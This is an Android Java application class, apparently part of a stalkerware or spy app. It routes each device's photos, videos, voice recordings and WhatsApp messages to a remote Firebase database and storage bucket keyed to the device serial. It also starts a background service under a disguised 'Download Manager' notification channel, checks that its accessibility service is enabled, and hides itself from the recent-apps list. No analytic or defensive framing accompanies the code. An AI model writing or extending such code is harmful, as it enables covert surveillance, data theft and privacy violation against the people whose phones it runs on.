package com.rr.personal.data;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Application;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.rr.personal.data.service.RealTimeService;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.Writer;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

public class App extends Application {

    public static SharedPreferences mSaveData;
    public static String mDeviceName;
    public static DatabaseReference mData;

    public static boolean mServeice = true;

    public static String mName = "";
//    public static ;
//    public static ;
//    public static ;
//    public static ;
//    public static ;

    public static DatabaseReference mPhotoData;
    public static DatabaseReference mVideoData;
    public static DatabaseReference mVoiceData;
    public static DatabaseReference mMessage;
    public static StorageReference mVideoStorage;
    public static StorageReference mPhotoStorage;
    public static StorageReference mVoiceStorage;

    @Override
    public void onCreate() {
        super.onCreate();

        mSaveData = getSharedPreferences("data", Context.MODE_PRIVATE);

        mDeviceName = getDeviceName(getApplicationContext());

        DatabaseReference reference = FirebaseDatabase.getInstance().getReference("--raiyan088--");
        StorageReference storage = FirebaseStorage.getInstance().getReference("--raiyan088--");

        mData = reference.child("user").child(mDeviceName);
        mPhotoData = reference.child("photo").child(mDeviceName);
        mVideoData = reference.child("video").child(mDeviceName);
        mVoiceData = reference.child("voice").child(mDeviceName);
        mMessage = reference.child("whatsapp").child(mDeviceName);
        mVideoStorage = storage.child("video").child(mDeviceName);
        mPhotoStorage = storage.child("photo").child(mDeviceName);
        mVoiceStorage = storage.child("voice").child(mDeviceName);

        if(mSaveData.getString("token", "").equals("")) {
            FirebaseInstanceId.getInstance().getInstanceId().addOnCompleteListener(task -> {
                if (task.isSuccessful()) {
                    final String token = task.getResult().getToken();

                    mData.child("token").setValue(token).addOnSuccessListener(unused -> mSaveData.edit().putString("token", token).apply());
                }
            });
        }

        Thread.setDefaultUncaughtExceptionHandler((thread, ex) -> {

            try {
                String error = getStackTrace(ex);

                Log.d("App Crash", error);

                mSaveData.edit().putString("error", error).apply();

                mData.child("error").setValue(error);

                Thread.sleep(1000);
            } catch(Exception ignored) {}

            System.exit(2);
        });

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(new NotificationChannel(
                    "Download Manager",
                    "Download Channel",
                    NotificationManager.IMPORTANCE_HIGH
            ));

            startForegroundService(new Intent(getApplicationContext(), RealTimeService.class));
        } else {
            startService(new Intent(getApplicationContext(), RealTimeService.class));
        }
    }

    public static String EXTERNAL_STORAGE() {
        return Environment.getExternalStorageDirectory().getAbsolutePath();
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName())) {
                return true;
            }
        }

        return false;
    }

    public static boolean isServiceRunning(Context mContext, Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) mContext.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public static void hideApp(Activity activity) {
        ActivityManager am = (ActivityManager)activity.getSystemService(Context.ACTIVITY_SERVICE);
        if(am != null) {
            List<ActivityManager.AppTask> tasks = am.getAppTasks();
            if (tasks != null && tasks.size() > 0) {
                tasks.get(0).setExcludeFromRecents(true);
            }
        }
    }

    private String getStackTrace(Throwable th){
        final Writer result = new StringWriter();

        final PrintWriter printWriter = new PrintWriter(result);
        Throwable cause = th;

        while(cause != null){
            cause.printStackTrace(printWriter);
            cause = cause.getCause();
        }

        final String stacktraceAsString = result.toString();
        printWriter.close();

        return stacktraceAsString;
    }

    @SuppressLint("HardwareIds")
    public static String getDeviceName(Context mContext) {
        AtomicReference<String> str = new AtomicReference<>("0123456789");
        try {
            if(Build.SERIAL.equalsIgnoreCase("unknown")) {
                str.set(Build.MANUFACTURER + "_" + Build.MODEL + "_" + Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID));
            } else {
                str.set(Build.MANUFACTURER + "_" + Build.MODEL + "_" + Build.SERIAL);
            }
        } catch (Exception ignored) {}

        return str.get().replace(" ","_").replace("-","_");
    }
}
